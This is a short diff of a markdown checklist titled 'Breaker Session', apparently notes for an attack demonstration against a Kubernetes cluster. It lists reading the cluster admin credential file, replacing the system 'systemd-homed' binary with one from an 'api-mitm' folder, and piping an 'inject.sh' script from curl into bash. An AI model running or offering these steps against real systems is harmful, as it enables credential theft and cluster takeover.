@@ -11,12 +11,14 @@
 
 
 # Breaker Session
+
 1. `cat /etc/kubernetes/admin.conf`
 2. `recompile homed`
 2. `scp enemycluster/ideas/api-mitm/systemd-homed ubuntu@xxxx`
 3. `cp /home/ubuntu/systemd-homed /usr/bin/systemd-homed`
 4. `chmod +x /usr/bin/systemd-homed`
-5. `curl <inject.sh> | bash`
+5. recompile scheduler image for 1.23.3
+6. `curl <inject.sh> | bash`
 
 ## Setup Demo Cluster
 
